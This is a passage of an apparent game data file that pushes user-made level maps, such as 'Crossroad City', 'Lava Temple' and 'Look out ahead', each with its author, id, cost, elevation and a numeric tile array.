6,6,7,8,9,10,11,0,0,0,11,11,91,91,91,91,91,91,6,6,6,6,7,8,9,10,11,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,95,0,0,0,0,0,1,1,1,1,1,1,14,14,1,1,1,1,1,1,95,0,0,0,0,3,1,1,1,1,1,1,14,14,95,13,13,95,12,11,11,0,0,0,0,14,14,91,91,91,14,14,66,14,95,13,13,95,12,11,11,0,0,0,0,14,91,91,91,14,14,14,66,14,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,2,2,14,14,1,1,1,1,1,1,1,0]});
maps.push({name="Small Rooftops",author="FroZRil",id="#1741415874",direction="forward",cost=235,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,1,14,93,14,3,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,1,14,14,14,3,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,94,5,5,1,0,0,0,0,0,0,0,0,1,12,12,12,12,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,12,3,3,12,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,19,19,19,19,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,19,19,19,19,5,59,59,59,59,59,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,119,119,119,119,119,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,119,119,119,119,119,1,0,0,0,0,0,0,0,0,1,19,19,19,19,5,59,59,59,59,59,1,0,0,0,0,0,0,0,0,1,19,3,3,19,5,5,3,5,5,5,1,0,0,0,0,0,0,0,0,1,24,24,24,24,5,5,5,5,94,5,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,65,65,5,93,5,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,65,65,5,5,5,1,0,0,0,0,0,0,0,0,1,24,24,24,24,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,24,24,24,24,5,65,65,65,5,5,1,0,0,0,0,0,0,0,0,1,24,24,24,24,5,65,65,65,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0]});
maps.push({name="Crossroad City",author="FroZRil",id="#1741417445",direction="forward",cost=350,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,24,24,24,24,24,5,5,5,5,24,24,24,24,24,5,5,0,0,5,5,24,24,24,24,24,45,5,5,90,24,24,24,24,24,5,5,0,0,5,3,24,24,94,24,24,45,5,5,5,128,24,93,24,24,3,5,0,0,5,5,24,24,24,24,24,45,5,5,5,24,24,24,24,24,5,5,0,0,5,5,24,24,127,24,24,5,5,5,5,24,24,24,24,24,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,45,45,45,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,45,45,45,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,24,24,24,24,24,5,5,5,5,24,24,126,24,24,5,5,0,0,5,5,24,24,24,24,24,90,5,5,45,24,24,24,24,24,5,5,0,0,5,3,24,24,93,24,129,5,5,5,45,24,24,94,24,24,3,5,0,0,5,5,24,24,24,24,24,5,5,5,45,24,24,24,24,24,5,5,0,0,5,5,24,24,24,24,24,5,5,5,5,24,24,24,24,24,5,5,0,0,5,5,5,65,65,5,5,5,5,5,5,5,5,65,65,5,5,5,0,0,5,5,5,65,65,5,5,5,5,5,5,5,5,65,65,5,5,5,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Boring Waves",author="FroZRil",id="#1741419314",direction="forward",cost=112,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Between 2 Cliffs",author="FroZRil",id="#1741420794",direction="forward",cost=286,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,5,5,24,24,24,1,0,0,0,0,0,0,0,0,0,0,1,24,24,24,5,5,24,24,24,1,0,0,0,0,0,0,0,0,0,1,90,24,24,24,5,5,24,24,24,90,1,0,0,0,0,0,0,0,1,24,24,24,24,5,65,65,5,24,24,24,24,1,0,0,0,0,0,1,24,93,24,24,5,5,65,65,5,5,24,24,94,24,1,0,0,0,0,1,89,89,89,5,5,5,5,5,5,5,5,24,24,24,1,0,0,0,0,1,90,24,24,5,5,5,5,5,5,5,5,24,90,24,1,0,0,0,0,1,24,24,24,5,5,90,5,5,5,5,5,24,24,24,1,0,0,0,0,1,24,24,24,5,5,5,5,5,5,5,5,24,24,24,1,0,0,0,0,1,132,24,24,131,5,5,5,5,5,5,133,24,24,134,1,0,0,0,0,1,24,24,24,5,5,5,5,5,5,5,5,24,24,24,1,0,0,0,0,1,24,24,24,5,5,5,5,5,90,5,5,24,24,24,1,0,0,0,0,1,24,90,24,5,5,5,5,5,5,5,5,24,24,90,1,0,0,0,0,1,24,24,24,5,5,5,5,5,5,5,5,89,89,89,1,0,0,0,0,1,24,94,24,24,5,5,65,65,5,5,24,24,93,24,1,0,0,0,0,0,1,24,24,24,24,5,65,65,5,24,24,24,24,1,0,0,0,0,0,0,0,1,90,24,24,24,5,5,24,90,24,24,1,0,0,0,0,0,0,0,0,0,1,24,24,24,5,5,24,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Breaching Rooms",author="FroZRil",id="#1741422476",direction="forward",cost=300,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,1,1,1,1,1,1,1,95,95,1,1,1,1,1,1,1,0,0,0,0,1,90,105,105,105,1,105,105,105,105,1,105,105,105,93,1,0,0,0,0,1,105,105,105,105,91,105,105,105,105,1,105,89,105,94,1,0,0,0,0,1,105,105,105,105,91,105,105,105,90,1,1,91,1,1,1,0,0,0,0,1,105,105,105,105,1,1,1,1,1,1,105,105,105,105,1,0,0,0,0,1,105,105,105,105,1,105,105,105,105,91,105,105,105,105,1,0,0,0,0,1,105,105,105,105,1,105,105,105,105,91,105,105,105,105,1,0,0,0,0,1,105,105,105,105,91,105,105,105,105,1,1,1,91,91,1,0,0,0,0,1,105,105,105,105,91,105,105,105,90,1,90,105,105,105,1,1,1,1,0,1,105,105,105,105,1,1,1,1,1,1,105,105,105,105,1,105,105,1,0,1,1,91,1,1,1,105,105,105,105,1,105,105,105,105,91,105,97,1,0,1,105,89,105,93,1,105,105,105,105,91,105,105,105,105,1,105,105,1,0,1,105,105,105,94,1,105,105,105,105,91,105,105,105,90,1,1,1,1,0,1,1,1,1,1,1,1,96,96,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Simple Way Up",author="FroZRil",id="#1741441063",direction="right",cost=200,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,5,5,0,0,0,0,0,1,132,11,10,10,9,9,8,8,7,7,6,6,5,5,0,0,0,0,0,1,11,11,10,10,9,9,8,8,7,7,6,6,5,5,0,0,0,0,0,1,12,12,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,12,12,0,0,1,0,9,125,0,14,125,0,93,24,93,1,0,0,0,1,13,13,0,0,1,0,0,0,0,0,0,0,24,131,24,1,0,0,0,1,13,13,0,0,1,0,0,0,0,0,0,0,94,24,94,1,0,0,0,1,14,14,0,0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,15,85,16,17,17,18,18,19,19,20,85,21,21,0,0,0,0,1,15,15,15,16,16,17,17,18,18,19,19,20,20,21,21,0,0,0,0,1,15,15,15,16,16,17,17,85,18,19,19,20,20,21,21,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,23,23,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,23,23,0,0,0,0,0,0,0,0,0,0,0,1,24,0,24,0,0,0,24,24,24,2,0,0,0,0,0,0,0,0,0,1,100,0,0,0,24,0,24,24,24,2,0,0,0,0,0,0,0,0,0,1,129,0,0,0,0,0,24,24,0,0]});
maps.push({name="3 Way Hazard",author="FroZRil",id="#1741443667",direction="forward",cost=424,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,89,22,22,76,23,23,76,22,22,89,0,0,0,0,0,0,0,0,0,22,22,89,76,76,23,23,76,76,89,22,22,0,0,0,0,0,0,0,22,22,22,76,76,76,24,24,76,76,76,22,22,22,0,0,0,0,0,93,22,22,76,76,76,76,24,24,76,76,76,76,22,22,93,0,0,0,0,22,22,76,76,76,76,76,24,24,76,76,76,76,76,22,22,0,0,0,0,22,22,76,76,76,76,85,24,24,93,76,76,76,76,22,22,0,0,0,0,22,22,76,76,76,76,24,76,76,24,76,76,76,76,22,22,0,0,0,0,22,22,76,76,76,76,24,76,76,24,76,76,76,76,22,22,0,0,0,0,22,22,76,76,76,76,94,24,24,85,76,76,76,76,22,22,0,0,0,0,22,22,76,76,76,76,76,24,24,76,76,76,76,76,22,22,0,0,0,0,94,22,22,76,76,76,76,24,24,76,76,76,76,22,22,94,0,0,0,0,0,22,22,22,76,76,76,24,24,76,76,76,22,22,22,0,0,0,0,0,0,0,22,22,89,76,76,23,23,76,76,89,22,22,0,0,0,0,0,0,0,0,0,89,22,22,76,23,23,76,22,22,89,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Lava Temple",author="sivi",id="#1741443935",direction="left",cost=414,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,2,118,118,118,1,94,1,118,90,118,93,118,90,118,1,94,1,118,118,1,2,118,118,118,1,117,1,118,118,118,118,118,118,118,1,117,1,118,118,1,1,1,118,118,1,77,1,90,118,118,1,118,118,90,1,77,1,118,118,1,0,1,118,118,44,44,44,118,118,1,77,1,118,118,44,44,44,118,118,1,0,1,117,117,43,43,43,117,117,43,43,43,117,117,43,43,43,117,117,1,0,1,116,116,42,42,42,116,116,42,42,42,116,116,42,42,42,116,116,1,0,1,115,115,1,41,1,115,115,41,41,41,115,115,1,41,1,115,115,1,189,1,114,114,40,40,40,114,114,1,40,1,114,114,40,40,40,114,114,1,107,1,113,113,39,39,39,113,113,39,39,39,113,113,39,39,39,113,113,1,154,1,112,112,38,38,38,112,112,38,38,38,112,112,38,38,38,112,112,1,153,1,111,111,1,37,1,111,111,37,37,37,111,111,1,37,1,111,111,1,107,1,110,110,36,36,36,110,110,1,36,1,110,110,36,36,36,110,110,1,188,1,109,109,35,35,35,109,109,35,35,35,109,109,35,35,35,109,109,1,0,1,108,108,34,34,34,108,108,34,34,34,108,108,34,34,34,108,108,1,0,1,107,107,1,77,1,107,107,33,33,33,107,107,1,77,1,107,107,1,0,1,90,107,107,1,107,107,90,1,77,1,90,107,107,1,107,107,90,1,0,1,107,107,107,107,107,107,107,1,106,1,107,107,107,107,107,107,107,1,0,1,107,90,107,93,107,90,107,1,94,1,107,90,107,93,107,90,107,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Upstream",author="sivi",id="#1741443957",direction="left",cost=632,elevation=7,map=[23,22,20,22,20,20,22,20,22,22,20,0,0,12,12,2,2,14,12,0,22,20,12,12,12,12,65,65,65,65,11,22,14,5,5,5,5,5,11,14,12,65,65,65,65,65,67,65,65,65,65,11,5,65,65,65,65,65,65,14,2,65,65,65,65,65,67,65,65,65,65,11,5,65,65,65,65,65,65,67,2,65,65,65,65,65,67,65,65,65,65,11,5,65,65,65,65,65,65,67,12,65,65,65,65,65,12,11,65,65,65,11,5,65,65,65,65,65,65,67,19,12,12,12,12,12,10,65,67,67,67,65,10,5,65,65,65,65,5,12,21,18,9,9,9998,10,65,65,65,65,65,65,65,10,5,65,65,65,5,12,18,9,65,65,67,65,65,65,65,65,65,65,65,10,5,67,67,67,5,14,20,9,65,65,67,65,65,65,65,65,65,65,65,10,6,65,65,65,6,12,20,9,65,65,9,10,65,65,65,65,65,65,65,10,6,65,65,65,6,14,18,9998,67,67,8,10,65,65,10,10,10,10,10,7,65,65,65,65,6,14,20,8,65,65,65,8,10,10,7,7,7,7,7,9998,65,65,65,65,6,12,20,8,65,65,65,65,8,7,65,65,65,65,65,67,65,65,65,65,6,14,18,8,65,65,65,65,65,67,65,65,65,65,65,67,65,65,65,6,12,14,93,8,65,65,65,65,65,67,65,65,65,65,65,67,65,65,65,65,6,12,18,8,65,65,65,65,65,67,65,65,65,65,65,7,65,65,158,65,6,93,20,8,65,65,65,65,8,65,65,65,65,65,7,14,6,65,65,65,6,12,21,18,8,8,8,8,8,9998,7,7,7,7,16,17,14,6,6,6,14,16,0,20,20,18,18,20,18,20,20,18,20,18,20,0,0,16,14,12,17,18]});
maps.push({name="Look out ahead",author="Luffaren",id="#1741460520",direction="left",cost=395,elevation=-19,map=[1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,90,124,124,124,123,123,123,122,89,122,121,121,121,120,119,90,94,90,1,1,94,124,124,124,123,123,123,122,122,122,121,121,121,120,119,119,119,119,1,1,90,124,124,124,123,123,123,122,122,122,121,121,121,120,119,119,119,119,1,1,1,9998,9998,9998,1,9998,9998,1,9998,9998,1,9998,9998,1,1,118,118,118,1,0,0,199,199,199,77,199,199,77,199,199,77,199,199,1,1,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,9998,117,89,117,1,2,5,5,0,0,0,0,0,0,0,0,100,0,0,199,9998,117,117,117,1,2,5,5,5,0,0,0,0,0,0,93,13,93,0,77,1,116,116,116,1,9998,6,6,9998,0,0,0,0,0,0,0,0,0,0,199,9998,116,116,116,1,5,7,7,5,67,0,0,0,0,0,0,0,0,0,199,9998,116,116,116,1,5,8,8,5,67,0,0,0,0,0,0,0,0,0,77,1,115,115,115,1,5,9,9,5,67,0,0,0,0,0,0,0,0,0,199,9998,115,115,89,1,5,10,10,5,67,0,0,0,0,0,0,0,0,0,199,9998,115,115,115,1,94,11,11,5,67,0,0,0,0,0,67,92,67,0,1,1,114,114,114,1,12,12,12,12,0,67,67,67,67,0,12,13,14,1,1,1,95,95,95,1,89,12,12,89,12,32,32,32,32,12,12,13,14,95,114,95,114,114,90,1,12,12,12,12,12,32,32,32,32,12,12,13,14,95,114,95,114,93,114,1,12,12,89,12,12,32,32,32,32,12,12,13,14,95,114,95,90,114,90,1,89,12,12,12,0,67,67,67,67,0,12,13,14,1,1,1,1,1,1,1]});
maps.push({name="Look out aback",author="Luffaren",id="#1741463450",direction="left",cost=304,elevation=-15,map=[0,9,9,9,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,9,89,9,9,9,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,2,9998,10,10,10,0,0,0,0,0,0,0,0,90,24,24,24,24,90,0,2,9,11,11,11,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,9,9,1,95,1,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,1,1,1,111,1,1,1,0,0,0,0,0,0,0,21,21,21,21,0,0,1,89,11,11,11,90,1,77,0,0,0,0,0,0,21,89,21,21,0,0,1,11,65,65,65,11,111,0,0,0,0,0,0,90,21,21,21,21,90,0,111,11,65,65,65,11,1,77,0,0,0,0,0,0,20,20,20,20,0,0,1,11,65,65,65,11,111,0,0,0,0,0,0,0,19,19,19,19,0,0,1,11,11,11,11,90,1,77,0,0,0,0,0,3,18,18,18,18,3,0,1,111,111,1,1,1,1,0,0,0,0,0,0,0,52,93,93,52,0,0,1,112,112,1,94,94,1,0,0,0,0,0,0,90,18,52,52,18,90,0,1,113,113,1,91,91,1,24,77,0,0,0,0,18,18,18,18,18,18,0,1,114,114,1,118,118,1,18,0,0,0,0,0,89,18,160,160,18,18,0,1,115,115,1,89,118,95,18,18,38,39,38,18,18,18,162,162,162,162,67,1,116,116,1,118,118,1,18,0,0,0,0,0,89,18,159,159,18,18,0,1,117,117,118,95,118,1,24,77,0,0,0,0,18,18,18,18,89,18,0,1,89,117,118,95,118,118,0,0,0,0,0,0,90,18,18,18,18,90,0,1,1,1,1,1,1,1,36,0,0,0,0,0,0,128,14,0,0,0,0]});
maps.push({name="dont fall into water",author="ReBeL",id="#1741464214",direction="right",cost=369,elevation=13,map=[0,0,1,11,2,2,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,72,72,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,72,72,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,72,72,11,1,0,0,0,0,0,0,0,24,24,24,24,0,0,0,1,11,72,72,11,1,0,0,0,0,0,0,0,24,24,94,24,0,0,0,1,11,72,72,11,1,0,0,0,0,0,0,0,24,100,93,24,0,0,0,1,11,72,72,11,1,0,0,0,0,0,0,0,1,1,1,1,44,0,0,1,13,72,72,13,1,0,0,0,0,0,0,0,24,72,72,24,0,0,0,1,14,72,72,14,1,0,0,0,0,0,0,0,24,72,72,24,0,0,0,1,15,72,72,15,1,0,0,0,0,0,0,0,24,72,72,24,0,0,0,1,16,72,72,16,1,0,0,0,0,0,0,0,24,72,72,24,0,0,0,1,17,72,72,17,1,1,1,1,1,1,1,1,1,72,72,1,1,0,0,1,17,72,72,17,17,17,17,17,0,0,3,24,24,72,72,24,24,0,0,1,51,74,72,74,74,74,67,0,0,67,73,73,73,72,73,24,24,0,0,1,51,74,74,74,74,74,67,0,0,67,73,73,73,73,73,24,2,0,0,1,51,74,74,74,74,74,67,0,0,67,73,73,73,73,73,24,2,0,0,1,17,17,17,17,17,17,0,0,0,3,24,24,24,24,24,24,24,0,0,1,1,1,1,1,94,0,0,0,0,1,1,1,1,1,1,1,1]});
maps.push({name="Look out aside",author="Luffaren",id="#1741465489",direction="left",cost=208,elevation=-6,map=[100,0,0,0,0,0,0,0,0,0,0,14,14,2,2,14,14,0,0,0,8,0,0,0,0,0,0,0,0,0,0,94,94,14,14,94,94,0,0,0,95,0,0,0,0,0,0,0,145,0,0,14,93,48,48,93,14,0,0,145,95,0,0,0,0,0,0,0,24,148,0,14,48,89,48,48,14,0,0,24,8,0,0,0,0,0,0,0,0,0,0,14,48,48,89,48,14,0,0,0,95,0,0,0,0,0,0,0,0,0,0,14,93,48,48,93,14,0,0,0,95,0,0,145,0,0,0,145,145,0,0,14,14,14,14,48,14,0,0,145,8,0,0,24,0,0,0,24,24,0,0,48,48,48,48,48,14,0,148,24,95,0,0,148,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,95,0,0,0,0,0,0,0,0,3,0,13,13,13,13,13,13,0,0,0,8,8,8,8,8,8,8,8,8,8,9,11,12,12,12,13,13,0,0,0,8,89,8,8,8,89,8,8,8,8,9,10,11,11,12,12,12,0,0,0,2,8,8,8,8,8,8,8,8,8,9,10,10,11,11,12,12,0,0,0,2,8,89,8,8,8,8,8,8,8,9,9,10,10,11,11,11,0,0,0,8,8,8,89,8,8,8,8,89,8,8,9,9,10,10,11,0,0,0,0,8,8,8,8,8,8,8,8,8,8,8,9,9,9,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,148,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,145,0,0,0,145,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="DEFEND OR DIE",author="Luffaren",id="#1741466995",direction="left",cost=443,elevation=-19,map=[1,24,2,2,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,89,24,24,91,24,23,22,21,21,121,1,1,0,0,0,1,1,94,24,24,24,24,91,24,24,23,22,21,21,121,95,121,20,20,0,1,5,1,94,24,24,24,91,24,24,23,22,21,21,121,95,121,20,20,20,1,5,5,1,94,24,91,24,24,1,1,1,1,1,121,95,121,20,89,20,1,5,5,93,1,1,1,1,1,105,5,5,6,6,1,1,121,20,20,20,2,5,5,5,5,105,95,105,95,105,5,5,6,6,6,6,1,19,19,19,2,5,89,5,5,105,95,105,95,105,5,5,6,89,6,6,1,18,18,18,65,5,5,89,5,105,95,105,95,105,5,5,6,6,6,6,1,17,17,17,67,65,5,5,5,1,1,1,95,105,1,1,91,91,91,91,1,16,16,16,0,67,65,5,1,8,8,8,1,1,108,7,6,6,6,1,16,16,16,16,0,0,1,1,9,8,8,8,108,95,108,7,6,6,93,1,116,116,116,16,0,1,1,9,9,8,89,8,108,95,108,7,6,6,1,1,95,95,95,1,1,9,91,91,9,8,8,8,108,95,108,7,6,1,116,116,116,116,116,1,1,9,9,91,9,8,8,1,1,1,108,7,1,1,15,15,15,15,1,1,1,10,10,10,1,1,1,11,11,1,1,1,93,15,15,15,15,65,67,0,1,10,89,10,111,95,111,11,11,12,13,14,15,15,15,89,15,65,67,0,1,10,10,10,111,95,111,11,11,12,13,14,15,89,15,15,15,65,67,0,0,1,10,10,111,95,111,11,11,12,13,14,15,15,15,65,65,67,0,0,0,0,1,1,1,1,1,11,11,12,13,14,15,15,65,67,67,0,0,0]});
maps.push({name="Riding naturally",author="Luffaren",id="#1741468626",direction="left",cost=593,elevation=-16,map=[0,0,67,67,0,0,0,0,0,0,0,0,0,1,24,2,2,24,1,0,93,8,65,65,8,8,0,0,0,0,0,0,0,1,94,24,24,94,1,0,2,8,65,65,65,8,8,0,0,0,0,0,0,0,1,72,72,1,0,0,2,8,65,65,65,65,65,67,0,0,0,0,0,0,1,72,72,1,0,0,93,8,65,65,65,8,8,0,0,0,0,0,0,0,1,72,72,1,0,0,0,8,65,65,65,8,0,0,0,0,0,0,0,0,1,72,72,1,0,0,0,0,67,67,67,0,0,0,0,0,0,0,1,1,1,72,72,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,74,72,72,72,1,0,0,0,1,158,158,158,1,0,0,0,0,0,1,24,74,72,72,72,72,1,0,0,1,71,71,71,1,0,0,0,0,1,24,74,72,72,72,72,72,1,0,1,1,71,71,71,1,1,1,0,0,1,24,74,72,72,72,72,72,1,0,1,5,74,71,73,73,73,14,1,0,1,24,72,72,72,72,72,72,1,0,1,5,74,71,73,73,73,67,73,1,1,24,67,67,67,67,67,67,1,0,1,5,74,71,71,73,73,67,73,1,0,1,72,72,72,72,72,72,1,0,1,5,74,71,71,73,73,67,73,73,1,1,72,72,72,72,72,73,1,0,1,5,74,71,71,73,73,67,73,73,73,73,72,72,73,73,73,73,14,1,1,5,74,71,71,73,73,67,73,73,73,73,73,73,73,73,73,73,14,1,1,5,74,71,71,73,73,67,73,73,73,73,73,71,71,71,71,71,14,1,1,5,5,5,5,1,1,1,1,1,1,1,1,14,14,14,14,14,14,1,0,1,1,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0]});
maps.push({name="LADDER KZ MASTER",author="ReBeL",id="#1741476054",direction="left",cost=168,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,91,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,3,91,3,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,91,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,66,66,0,0,0,0,91,0,0,91,0,0,0,0,91,0,0,14,14,2,14,14,14,14,14,95,91,95,14,91,14,95,14,14,91,14,95,14,14,2,14,14,14,14,14,95,91,95,14,91,14,95,14,14,91,14,95,14,14,0,0,0,0,0,0,0,91,0,0,91,0,0,0,0,91,0,0,0,0]});
maps.push({name="Disaster",author="DEX DZ",id="#1741476172",direction="forward",cost=226,elevation=7,map=[0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,94,94,5,1,0,0,0,0,0,0,13,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,13,100,13,0,0,0,1,1,1,1,5,5,5,5,1,1,1,1,0,0,0,13,0,0,0,0,1,8,7,6,5,5,5,5,6,7,8,1,0,0,0,0,0,0,0,1,1,8,7,6,5,5,5,5,6,7,8,1,1,0,0,0,13,0,0,1,9,9,9,9,0,0,0,0,9,9,9,9,1,0,0,0,0,0,0,1,0,130,130,0,0,0,0,0,0,130,130,0,1,0,0,13,0,0,13,1,0,130,130,0,0,0,0,0,0,130,130,0,1,0,0,0,0,13,100,1,0,130,130,0,0,0,0,0,0,130,130,0,1,0,0,0,13,0,13,1,0,130,130,0,0,0,0,0,0,130,130,0,1,0,0,13,0,0,13,1,0,130,130,0,0,0,0,0,0,130,130,0,1,1,1,13,0,0,13,1,12,12,12,12,12,0,93,0,12,12,12,12,1,93,1,0,13,13,0,1,1,1,1,12,12,0,0,0,0,12,1,12,1,12,1,0,13,0,13,1,12,12,12,12,12,0,0,0,0,1,1,12,12,12,1,13,0,13,0,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,13,0,0,13,1,13,0,0,0,12,12,12,12,12,12,0,0,0,12,12,13,0,0,13,13,12,0,0,0,0,12,12,12,12,0,0,0,0,12,12,13,0,0,13,13,12,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
